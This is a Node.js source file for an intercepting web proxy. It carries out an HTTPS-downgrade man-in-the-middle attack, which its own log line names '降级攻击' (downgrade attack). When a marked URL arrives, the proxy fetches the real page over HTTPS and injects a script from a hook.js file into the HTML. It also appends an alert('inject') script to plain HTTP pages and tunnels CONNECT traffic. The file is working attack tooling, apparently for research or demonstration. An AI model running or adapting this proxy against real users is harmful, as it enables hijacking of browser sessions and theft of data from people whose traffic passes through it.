var http       = require('http'),
    net        = require('net'),
    https      = require('https'),
    injectFind = require('./inject'),
    fs         = require('fs')

//var PROXY_HOST = 'web-proxy.oa.com'
//var PROXY_PORT = 8080

var PROXY_HOST = '127.0.0.1'
var PROXY_PORT = 80


var injectCode = fs.readFileSync('./front/hook.js')

var regex_hostport = /^([^:]+)(:([0-9]+))?$/
var getHostPortFromString = function (hostString, defaultPort) {
	var host = hostString;
	var port = defaultPort;

	var result = regex_hostport.exec(hostString);
	if (result != null) {
		host = result[1];
		if (result[2] != null) {
			port = result[3];
		}
	}

	return ( [host, port] );
}


var httpsForward = function (req, res) {
	delete req.headers['accept-encoding']
	var proxyReq = https.request({
		host   : req.headers['host'],
		method : req.method,
		headers: req.headers
	}, function (proxyRes) {
		var findInject = false
		proxyRes.headers.connection = 'close'
		delete proxyRes.headers['content-length']
		res.writeHead(proxyRes.statusCode, proxyRes.headers)

		proxyRes.on('data', function (chunk) {
			if (findInject) {
				res.write(chunk, 'binary')
			} else {
				var index = injectFind(chunk)
				if (index >= 0) {
					findInject = true
					res.write(chunk.slice(0, index + 1), 'binary')
					res.write('<script>' + injectCode + '</script>')
					res.write(chunk.slice(index + 1), 'binary')
				} else {
					res.write(chunk, 'binary')
				}
			}
		})
		proxyRes.on('end', function () {
			res.end()
		})
	})
	proxyReq.end()
}


// for HTTP
var server = http.createServer(function (req, res) {
	if (req.url.indexOf('abcd1234') >= 0) {
		console.log('降级攻击: ' + req.url)
		httpsForward(req, res)
		return
	}

	var hostport = getHostPortFromString(req.url)

	var proxyReq = http.request({
		host   : req.headers['host'],
		port   : hostport[1],
		path   : req.url,
		method : req.method,
		headers: req.headers
	}, function (proxyRes) {

		proxyRes.headers.connection = 'close'
		delete proxyRes.headers['content-length']
		res.writeHead(proxyRes.statusCode, proxyRes.headers)

		//var contentType
		//if ((contentType = proxyRes.headers['content-type']) && contentType.indexOf('text/html') >= 0) {
		//	res.write('<div>inject me</div>')
		//}

		proxyRes.on('data', function (chunk) {
			res.write(chunk, 'binary')
		})

		proxyRes.on('end', function () {
			var contentType
			if ((contentType = proxyRes.headers['content-type']) && contentType.indexOf('text/html') >= 0) {
				res.write('<script>alert("inject")</script>')
			}
			res.end()
		})
	})

	proxyReq.on('error', function (e) {
		console.error(e)
	})

	proxyReq.end()
}).listen(9494)

server.on('error', function (err) {
	console.error(err)
})


// add handler for HTTPS (which issues a CONNECT to the proxy)
server.on('connect', function (request, socket, bodyhead) {
	//console.log('https come: ', request.url)
	//console.log(request.headers)

	var result = getHostPortFromString(request.url, 443);
	var port = result[1]
	var host = result[0]

	// set up TCP connection
	var proxySocket = new net.Socket();
	proxySocket.connect({
		port: parseInt(port),
		host: host
	}, function () {
		// tell the caller the connection was successfully established
		socket.write("HTTP/" + request.httpVersion + " 200 Connection established\r\n\r\n");
	})

	//if (request.getHeader('Content-Type').indexOf('text/html') >= 0) {
	//	socketRequest.write('<script>alert("inject")</script>')
	//}

	proxySocket.on('data', function (chunk) {
		socket.write(chunk);
	})

	proxySocket.on('end', function () {
		socket.end();
	})

	socket.on('data', function (chunk) {
		proxySocket.write(chunk);
	})

	socket.on('end', function () {
		proxySocket.end();
	})

	proxySocket.on('error', function (err) {
		socket.write("HTTP/" + request.httpVersion + " 500 Connection error\r\n\r\n");
		socket.end();
	})

	socket.on('error', function (err) {
		proxySocket.end();
	})
})

//// create HTTPS server
//https.createServer({
//	key : fs.readFileSync('d:/catest/proxpy.pem'),
//	cert: fs.readFileSync('d:/catest/proxpy.crt')
//}, createOnRequest(createProxyReq, http))
//	.on('error', function (err) {
//		console.error(err)
//	})
//	.listen(8887)
//console.log('listen to 127.0.0.1:443')